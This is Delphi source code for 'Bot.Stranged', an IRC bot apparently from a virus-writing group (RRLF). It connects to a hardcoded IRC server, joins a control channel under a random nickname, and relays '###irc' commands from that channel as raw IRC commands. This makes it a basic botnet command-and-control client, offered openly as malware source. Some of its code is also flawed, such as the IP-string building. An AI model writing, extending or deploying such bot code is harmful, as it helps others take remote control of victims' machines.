{
  Bot.Stranged

  Simple IRC bot made by Hutley//RRLF

  www.Hutley.de.vu  // hutleyvx@gmail.com
  www.RRLF.de.vu

  uStrList (Unit) by p0ke
}
program bot.stranged;

uses
  Windows, Winsock, uStrList;

const
  strg_irc_server: string = '64.18.128.86'; //UNDERNET: 64.18.128.86
  strg_irc_bracket: string = '###';
  strg_chan: string = '#Huteck';
  strg_chan_pass: string = '';

var
  buffot: array[0..9000] of char;
  wsadt: TWSADATA;
  sckt: TSocket;
  addr: TSockAddrIn;

procedure SplitParams(S: string; var X: TStrList);
var
  I: WorD;
begin
  X.Clear;
  repeat
    I := Pos(' ', S);
    if I > 0 then
    begin
      X.Add(Copy(S, 1, I - 1));
      Delete(S, 1, I);
    end;
  until I = 0;
  X.Add(S);
end;

function create_nick: string;
var
  nick: string;
  i: integer;
const
  str = '1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ';
  max = 10;
begin
  nick := '';
  for i := 1 to max do
  begin
    randomize;
    nick := nick + str[random(length(str)) + 1];
  end;
  result := 'Hut' + nick
end;

procedure send_cmd(s: string);
begin
  send(sckt, s[1], length(s), 0);
end;

procedure read_it;
var
  data, tmp, tmp1, nickname, all: string;
  parametro: TStrList;
label
  check;
begin
  parametro := TStrList.Create;
  nickname := create_nick;

  data := 'USER Huteck 13 * :' + nickname + #13#10;
  send_cmd(data);

  data := 'NICK ' + nickname + #10 + #13;
  send_cmd(data);

  while recv(sckt, buffot, sizeof(buffot), 0) > 0 do
  begin
    tmp := string(buffot);
    ZeroMemory(@buffot, SizeOf(buffot));

    while pos(#10, tmp) > 0 do
    begin
      tmp1 := copy(tmp, 1, Pos(#10, tmp) - 1);
      Delete(tmp, 1, Pos(#10, tmp));

      if tmp1[Length(tmp1)] = #13 then
        Delete(tmp1, Length(tmp1), 1);

      SplitParams(tmp1, parametro);

      if parametro.Strings(0) = 'PING' then
      begin
        data := 'PONG ' + parametro.Strings(1) + #13#10;
        send_cmd(data);
      end;

      if pos('MOTD', tmp1) > 0 then
      begin
        data := 'JOIN ' + strg_chan + ' ' + strg_chan_pass + #13#10;
        send_cmd(data);
      end;

      if Pos('PRIVMSG ' + strg_chan + ' :' + strg_irc_bracket + 'irc', tmp1) > 0 then
      begin
        all := Copy(tmp1, Pos('irc ', tmp1) + 4, Length(tmp1));
        data := all + #13#10;
        send_cmd(data);
      end;

      if Pos('PRIVMSG ' + strg_chan + ' :' + strg_irc_bracket + 'cmds', tmp1) > 0 then
      begin
        data := 'PRIVMSG ' + strg_chan + ' :' + '--- THE COMMANDS ---' + #13#10;
        send_cmd(data);
        sleep(1000);
        data := 'PRIVMSG ' + strg_chan + ' :' + strg_irc_bracket + 'irc COMMAND (execute irc commands)' + #13#10;
        send_cmd(data);
        sleep(1000);
        data := 'PRIVMSG ' + strg_chan + ' :' + strg_irc_bracket + 'irc JOIN :#CHANNEL' + #13#10;
        send_cmd(data);
        sleep(1000);
        data := 'PRIVMSG ' + strg_chan + ' :' + strg_irc_bracket + 'exit (the bot exit of irc)' + #13#10;
        send_cmd(data);
        sleep(1000);
      end;

      if Pos(strg_irc_bracket + 'exit', tmp1) > 0 then
      begin
        data := 'QUIT - Hutley//RRLF' + #13#10;
        send_cmd(data);
      end;
      parametro.Clear;
    end;
  end;
end;

procedure conecta_irc;
begin
  try
    WSAStartup($101, WSADT);
    sckt := socket(AF_INET, SOCK_STREAM, 0);

    if sckt = INVALID_SOCKET then Exit;

    addr.sin_family := AF_INET;
    addr.sin_port := htons(6667);
    addr.sin_addr.S_addr := inet_addr(PChar(strg_irc_server));

    if connect(sckt, addr, SizeOf(addr)) > socket_error then read_it;
  except
    WSACleanup;
  end;
end;

function GetIP: string;
//--> Declare a Winsock na clausula uses da unit
var
  WSAData: TWSAData;
  HostEnt: PHostEnt;
  Name: string;
begin
  WSAStartup(2, WSAData);
  SetLength(Name, 255);
  Gethostname(PChar(Name), 255);
  SetLength(Name, length(PChar(Name)));
  HostEnt := gethostbyname(PChar(Name));
  with HostEnt^ do
  begin
    Result := h_addr^[0] + '.' + h_addr^[1] + '.' + h_addr^[2] + '.' + h_addr^[3];// Format('%d.%d.%d.%d', [Byte(h_addr^[0]), Byte(h_addr^[1]),
     // Byte(h_addr^[2]), Byte(h_addr^[3])]);
  end;
  WSACleanup;
end;

begin
MessageBox(0, PChar(GetIp), '', MB_OK);
conecta_irc; // OK!
end.

